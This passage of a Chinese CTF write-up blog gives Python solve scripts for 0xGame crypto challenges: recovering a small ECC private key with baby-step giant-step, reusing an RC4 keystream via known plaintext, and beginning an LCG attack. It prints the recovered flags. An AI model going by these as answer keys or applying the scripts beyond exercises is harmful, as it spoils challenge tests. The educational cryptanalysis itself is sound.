test_mask.to_bytes(<span class=\"number\">16</span>, order)</span><br><span class=\"line\">                cipher = AES.new(key, AES.MODE_ECB)</span><br><span class=\"line\">                plaintext = cipher.decrypt(ciphertext)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">b&#x27;0xGame&#x27;</span> <span class=\"keyword\">in</span> plaintext:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;找到 flag! mask=<span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(test_mask)&#125;</span>, order=<span class=\"subst\">&#123;order&#125;</span>&quot;</span>)</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Flag: <span class=\"subst\">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<p>得到<code>0xGame&#123;124ab3f1-4c3e-4d2a-8e6f-9b5e6c7d8f90&#125;</code></p>\n<h2 id=\"ECC\"><a href=\"#ECC\" class=\"headerlink\" title=\"ECC\"></a>ECC</h2><p>大步小步法计算私钥s。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> sha256</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ===============================================================</span></span><br><span class=\"line\"><span class=\"comment\"># 第一部分：椭圆曲线和 Point 类的定义</span></span><br><span class=\"line\"><span class=\"comment\"># ===============================================================</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 椭圆曲线 secp256r1 (NIST P-256) 的参数</span></span><br><span class=\"line\">p = <span class=\"number\">0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff</span></span><br><span class=\"line\">a = <span class=\"number\">0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc</span></span><br><span class=\"line\">b = <span class=\"number\">0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 辅助函数：计算模逆元</span></span><br><span class=\"line\"><span class=\"comment\"># 使用扩展欧几里得算法</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inv</span>(<span class=\"params\">n, p</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">pow</span>(n, p - <span class=\"number\">2</span>, p)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Point</span>:</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    一个表示 secp256r1 椭圆曲线上点的类</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, x, y</span>):</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.x = x</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.y = y</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.a = a</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.b = b</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.p = p</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 定义点加法</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__add__</span>(<span class=\"params\">self, other</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 处理无穷远点 (用 None 表示)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> other <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable language_\">self</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 两个点相同，执行点倍增</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span> == other:</span><br><span class=\"line\">            <span class=\"comment\"># lam = (3 * x^2 + a) / (2 * y) mod p</span></span><br><span class=\"line\">            lam = (<span class=\"number\">3</span> * <span class=\"variable language_\">self</span>.x * <span class=\"variable language_\">self</span>.x + <span class=\"variable language_\">self</span>.a) * inv(<span class=\"number\">2</span> * <span class=\"variable language_\">self</span>.y, <span class=\"variable language_\">self</span>.p) % <span class=\"variable language_\">self</span>.p</span><br><span class=\"line\">        <span class=\"keyword\">else</span>: <span class=\"comment\"># 两个点不同</span></span><br><span class=\"line\">            <span class=\"comment\"># lam = (y2 - y1) / (x2 - x1) mod p</span></span><br><span class=\"line\">            lam = (other.y - <span class=\"variable language_\">self</span>.y) * inv(other.x - <span class=\"variable language_\">self</span>.x, <span class=\"variable language_\">self</span>.p) % <span class=\"variable language_\">self</span>.p</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 计算新点的坐标</span></span><br><span class=\"line\">        <span class=\"comment\"># x3 = lam^2 - x1 - x2 mod p</span></span><br><span class=\"line\">        x3 = (lam * lam - <span class=\"variable language_\">self</span>.x - other.x) % <span class=\"variable language_\">self</span>.p</span><br><span class=\"line\">        <span class=\"comment\"># y3 = lam * (x1 - x3) - y1 mod p</span></span><br><span class=\"line\">        y3 = (lam * (<span class=\"variable language_\">self</span>.x - x3) - <span class=\"variable language_\">self</span>.y) % <span class=\"variable language_\">self</span>.p</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">return</span> Point(x3, y3)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 定义标量乘法 (s * P)</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__mul__</span>(<span class=\"params\">self, s</span>):</span><br><span class=\"line\">        current = <span class=\"variable language_\">self</span></span><br><span class=\"line\">        res = <span class=\"literal\">None</span> <span class=\"comment\"># 这是无穷远点</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 使用快速幂的思想 (二进制展开法)</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> s &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> s &amp; <span class=\"number\">1</span>: <span class=\"comment\"># 如果当前位是 1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> res <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                    res = current</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    res = res + current</span><br><span class=\"line\">            current = current + current <span class=\"comment\"># 点倍增</span></span><br><span class=\"line\">            s &gt;&gt;= <span class=\"number\">1</span> <span class=\"comment\"># 右移一位</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 定义点的相等性</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__eq__</span>(<span class=\"params\">self, other</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> other <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">self</span>.x == other.x <span class=\"keyword\">and</span> <span class=\"variable language_\">self</span>.y == other.y</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 为了能将 Point 对象作为字典的键，需要定义 __hash__</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__hash__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">hash</span>((<span class=\"variable language_\">self</span>.x, <span class=\"variable language_\">self</span>.y))</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 定义点的相反数</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__neg__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Point(<span class=\"variable language_\">self</span>.x, -<span class=\"variable language_\">self</span>.y % <span class=\"variable language_\">self</span>.p)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 方便打印</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__repr__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">f&quot;(<span class=\"subst\">&#123;self.x&#125;</span>, <span class=\"subst\">&#123;self.y&#125;</span>)&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ===============================================================</span></span><br><span class=\"line\"><span class=\"comment\"># 第二部分：实现并运行大步小步法 (BSGS) 来找到 s</span></span><br><span class=\"line\"><span class=\"comment\"># ===============================================================</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bsgs</span>(<span class=\"params\">base_point, target_point, search_limit</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    使用大步小步法求解椭圆曲线离散对数问题 (s * base_point = target_point)</span></span><br><span class=\"line\"><span class=\"string\">    :param base_point: 基点 P</span></span><br><span class=\"line\"><span class=\"string\">    :param target_point: 目标点 Q</span></span><br><span class=\"line\"><span class=\"string\">    :param search_limit: s 的最大搜索范围 (2^40)</span></span><br><span class=\"line\"><span class=\"string\">    :return: 整数 s</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    m = <span class=\"built_in\">int</span>(math.sqrt(search_limit)) + <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;步长 (m) 设置为: <span class=\"subst\">&#123;m&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 1. 计算小步 (Baby Steps) 并存入哈希表</span></span><br><span class=\"line\">    baby_steps_table = &#123;&#125;</span><br><span class=\"line\">    current_point = <span class=\"literal\">None</span> <span class=\"comment\"># 0 * P</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(m):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> current_point <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> baby_steps_table:</span><br><span class=\"line\">            baby_steps_table[current_point] = j</span><br><span class=\"line\">        <span class=\"keyword\">if</span> current_point <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            current_point = base_point</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            current_point = current_point + base_point</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;小步表已生成完成。&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 2. 计算大步的步进 (mP)</span></span><br><span class=\"line\">    mP = base_point * m</span><br><span class=\"line\">    mP_inv = -mP</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 3. 计算大步 (Giant Steps) 并查找匹配</span></span><br><span class=\"line\">    giant_step_point = target_point</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(m):</span><br><span class=\"line\">        <span class=\"comment\"># 查找 Q - i*m*P 是否在小步表中</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> giant_step_point <span class=\"keyword\">in</span> baby_steps_table:</span><br><span class=\"line\">            j = baby_steps_table[giant_step_point]</span><br><span class=\"line\">            s = i * m + j</span><br><span class=\"line\">            <span class=\"comment\"># 由于0*P和负点的情况，可能需要微调</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> base_point * s == target_point:</span><br><span class=\"line\">                 <span class=\"keyword\">return</span> s</span><br><span class=\"line\">        giant_step_point = giant_step_point + mP_inv</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">None</span> <span class=\"comment\"># 没有找到解</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ===============================================================</span></span><br><span class=\"line\"><span class=\"comment\"># 第三部分：整合并执行解密</span></span><br><span class=\"line\"><span class=\"comment\"># ===============================================================</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 题目中给出的 P 和 Q 的坐标</span></span><br><span class=\"line\">    P_coords = (<span class=\"number\">96072097493962089165616681758527365503518618338657020069385515845050052711198</span>, <span class=\"number\">106207812376588552122608666685749118279489006020794136421111385490430195590894</span>)</span><br><span class=\"line\">    Q_coords = (<span class=\"number\">100307267283773399335731485631028019332040775774395440323669585624446229655081</span>, <span class=\"number\">22957963484284064705317349990185223707693957911321089428005116099172185773154</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 创建 Point 对象</span></span><br><span class=\"line\">    P = Point(P_coords[<span class=\"number\">0</span>], P_coords[<span class=\"number\">1</span>])</span><br><span class=\"line\">    Q = Point(Q_coords[<span class=\"number\">0</span>], Q_coords[<span class=\"number\">1</span>])</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># s 的最大值是 2^40</span></span><br><span class=\"line\">    search_space = <span class=\"number\">2</span>**<span class=\"number\">40</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;正在使用大步小步法计算私钥 s，这可能需要一分钟左右...&quot;</span>)</span><br><span class=\"line\">    s = bsgs(P, Q, search_space)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> s <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;成功找到私钥 s: <span class=\"subst\">&#123;s&#125;</span>\\n&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 使用找到的 s 进行解密</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;正在使用 s 生成密钥并解密...&quot;</span>)</span><br><span class=\"line\">        key = sha256(<span class=\"built_in\">str</span>(s).encode()).digest()</span><br><span class=\"line\">        </span><br><span class=\"line\">        ciphertext = <span class=\"string\">b&#x27;:\\xe5^\\xd2s\\x92kX\\x96\\x12\\xb7dT\\x1am\\x94\\x86\\xcd.\\x84*-\\x93\\xb5\\x14\\x8d\\x99\\x94\\x92\\xfaCE\\xbd\\x01&amp;?\\xe1\\x01f\\xef\\x8f\\xe3\\x13\\x13\\x96\\xa6\\x0f\\xc0&#x27;</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class=\"line\">        </span><br><span class=\"line\">        decrypted_padded = cipher.decrypt(ciphertext)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 去除 PKCS7 填充</span></span><br><span class=\"line\">        padding_len = decrypted_padded[-<span class=\"number\">1</span>]</span><br><span class=\"line\">        flag = decrypted_padded[:-padding_len]</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span> + <span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;解密成功！ Flag 是: <span class=\"subst\">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> UnicodeDecodeError:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;解密成功！ Flag (原始字节): <span class=\"subst\">&#123;flag&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;未能找到 s。&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>得到<img src=\"C:\\Users\\ASUS\\AppData\\Roaming\\Typora\\typora-user-images\\image-20251009211926304.png\" alt=\"image-20251009211926304\"></p>\n<p>flag:<code>0xgame&#123;ECC_1s_4w3s0m3_but_n0t_perf3ct&#125;</code></p>\n<h2 id=\"流密码\"><a href=\"#流密码\" class=\"headerlink\" title=\"流密码\"></a>流密码</h2><p>已知加密key的明文是key*5,加密flag是32字节，所以msg也是32字节。两个密文是同一个RC4密钥加密的，我们可以求出密钥流的前32字节:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">keystream = ciphertext_key[:<span class=\"number\">32</span>] ⊕ P2[:<span class=\"number\">32</span>]</span><br></pre></td></tr></table></figure>\n\n<p>然后用该密钥就能求出msg：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msg = ciphertext_flag ⊕ keystream</span><br></pre></td></tr></table></figure>\n\n<p>完整解密脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ciphertext_flag = <span class=\"string\">b&#x27;n\\xab\\xa8\\xf6%\\xf5\\xbd\\xc5\\x97\\xe0\\xa0zCpV&#123;\\x04&amp;\\x8a\\xe5\\xe1TP\\xe0&#x27;</span></span><br><span class=\"line\">ciphertext_key = <span class=\"string\">b&#x27;\\x83=x&#123;\\xbcb\\r^3nl\\xbe\\xf4\\xdb\\xe5\\xc5\\x86\\x9e-Rt\\xf9\\x93\\t\\x883I\\xdd\\xcdx\\x01&quot;\\xb6d\\xd3A\\xa47|\\x8d\\xf8\\xe9\\xb1\\x04\\xfaz\\x83t\\xd5\\x85\\xd19\\xfd\\xbc\\x88\\xc8\\x05fJZ\\xae\\xba%\\x04B\\xd6a&gt;\\xf7\\xc6B\\xc0`\\xc2\\xc4\\x10\\x83BbJ&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">key_known = <span class=\"string\">b&quot;This is keyyyyyy&quot;</span> * <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取前 32 字节</span></span><br><span class=\"line\">key_part = key_known[:<span class=\"number\">32</span>]</span><br><span class=\"line\">cipher_key_part = ciphertext_key[:<span class=\"number\">32</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">keystream = <span class=\"built_in\">bytes</span>(a ^ b <span class=\"keyword\">for</span> a, b <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(cipher_key_part, key_part))</span><br><span class=\"line\"></span><br><span class=\"line\">msg = <span class=\"built_in\">bytes</span>(a ^ b <span class=\"keyword\">for</span> a, b <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(ciphertext_flag, keystream))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;msg =&quot;</span>, msg)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(msg.decode(<span class=\"string\">&#x27;gbk&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>后面发现这居然是GBK编码 ( ?   于是加了这一行<code>print(msg.decode(&#39;gbk&#39;))</code>，得到flag：<code>0xGame&#123;哈哈哈没想到我是中文的吧&#125;</code></p>\n<h2 id=\"LCG\"><a href=\"#LCG\" class=\"headerlink\" title=\"LCG\"></a>LCG</h2><p>RNG&#x3D;1，得到<code>Encrypted flag: [1935545177, 482262980, 1684118578, 997149554, 47161616, 102144924, 4155440928, 2213608845, 3538556139, 2928111657, 1154771317, 2133944243, 4148979403, 858055706, 3202218392, 1727302179, 3882966344, 1327689887, 3674970320, 2187841171, 2311252450, 482971802, 1729193547, 358579918, 927519716, 1913893602, 1846075319, 1560219121, 3400251736, 2548802464, 684657754, 989524061, 324600525, 197683993, 1609214168, 3772472918]</code>所以flag是36字节。</p>\n<p>先找RNG状态序列：从 <code>seed=1</code> 开始迭代 RNG，直到状态重复，记录所有状态序列 <code>states</code>。</p>\n<p>枚举a和b：因为 <code>a</code> 和 <code>b</code> 是 <code>states[k1]</code> 和 <code>states[k2]</code>，其中 <code>k1, k2</code> 在 <code>[1, 1024]</code> 范围内（因为 <code>random.randint(1, 1024)</code>），所以取 <code>a = states[i]</code>, <code>b = states[j]</code>，其中 <code>i</code> 和 <code>j</code> 从 1 到 min(1024, len(states))</p>\n<p>完整exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> inverse</span><br><span class=\"line\"></span><br><span class=\"line\">MOD = <span class=\"number\">2</span>**<span class=\"number\">32</span> + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">coefficients = [<span class=\"number\">77549</span>, <span class=\"number\">468297</span>, <span class=\"number\">447715</span>, <span class=\"number\">99019</span>, <span class=\"number\">1039399</span>, <span class=\"number\">618114</span>, <span class=\"number\">67952</span>, <span class=\"number\">512021</span>, <span class=\"number\">390981</span>, <span class=\"number\">412152</span>]</span><br><span class=\"line\">enc_flag = [<span class=\"number\">1935545177</span>, <span class=\"number\">482262980</span>, <span class=\"number\">1684118578</span>, <span class=\"number\">997149554</span>, <span class=\"number\">47161616</span>, <span class=\"number\">102144924</span>, <span class=\"number\">4155440928</span>, <span class=\"number\">2213608845</span>, <span class=\"number\">3538556139</span>, <span class=\"number\">2928111657</span>, <span class=\"number\">1154771317</span>, <span class=\"number\">2133944243</span>, <span class=\"number\">4148979403</span>, <span class=\"number\">858055706</span>, <span class=\"number\">3202218392</span>, <span class=\"number\">1727302179</span>, <span 